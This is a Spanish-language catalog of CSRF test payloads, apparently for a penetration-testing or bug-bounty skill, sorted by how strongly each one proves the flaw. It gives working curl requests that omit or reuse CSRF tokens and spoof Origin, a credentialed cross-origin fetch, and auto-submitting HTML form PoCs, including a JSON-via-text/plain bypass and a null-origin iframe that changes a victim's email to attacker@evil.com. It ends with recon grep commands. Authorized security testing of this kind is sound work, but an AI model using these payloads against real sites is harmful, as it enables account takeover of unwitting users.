# Payload Catalog — CSRF

Cada payload está etiquetado con el nivel del gate que demuestra (ver
SKILL.md). Usar el nivel correcto es lo que evita inflar severidad.

## Nivel 1 — curl / Repeater (derivado)

### Omitir el token
```bash
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" \
  -v 2>&1 | grep -E "HTTP|location|error"
```
Si pasa (2xx, sin error de token) → nivel 1 confirmado. **No es más que eso.**

### Origin/Referer spoofeado
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://dominio-que-el-server-trata-como-confiable.example
Cookie: <sesión autenticada>

username=csrf_poc
```
Si el check es un string-match naif contra un valor esperado, mandar ese
valor literal en `Origin` (o `Referer` si `Origin` solo no alcanza) lo
satisface sin entrega cross-site real.

### Reutilización de token entre sesiones
```bash
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')

curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" -v
```

## Nivel 2 — cross-origin real, disparado a mano (verificado-manual)

Desde la consola de devtools de una pestaña en OTRO origen (no localhost
simulado con headers falsos — un origen real distinto):
```javascript
fetch('https://target.com/api/heartbeat', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({status:'ok'})
})
```
Si la cookie viaja sola (no la pusiste vos en el header) y la acción se
ejecuta, eso es nivel 2. Todavía requirió que vos abrieras esa consola a
propósito — falta nivel 3 para saber si alcanza con que la víctima visite un link.

## Nivel 3 — PoC autoejecutable (verificado-completo)

### Form POST clásico
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### JSON CSRF vía `text/plain` (bypass de Content-Type enforcement)
`text/plain`, `application/x-www-form-urlencoded` y `multipart/form-data` son
los tres content-types "simple" que un form cross-origin manda sin
preflight. Un endpoint JSON es CSRF-resistente **solo si rechaza estos
tres** — no alcanza con que solo acepte `application/json`.
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat" enctype="text/plain">
    <!-- el browser manda: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

### Null-origin bypass (defensa: check de Referer/Origin que rechaza vacío pero acepta null)
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <form method=POST action='https://target.com/settings/email'>
    <input type=hidden name=email value='attacker@evil.com'>
  </form>
  <script>document.forms[0].submit()</script>
"></iframe>
```

## Grep / recon rápido
```bash
# Tokens CSRF en HTML
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'

# Forms POST sin token visible
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -Li "csrf\|token\|nonce"

# SameSite en cookies
curl -sI https://target.com/login | grep -i "set-cookie"

# RelayState en JS
grep -r "RelayState" --include="*.js" .
```
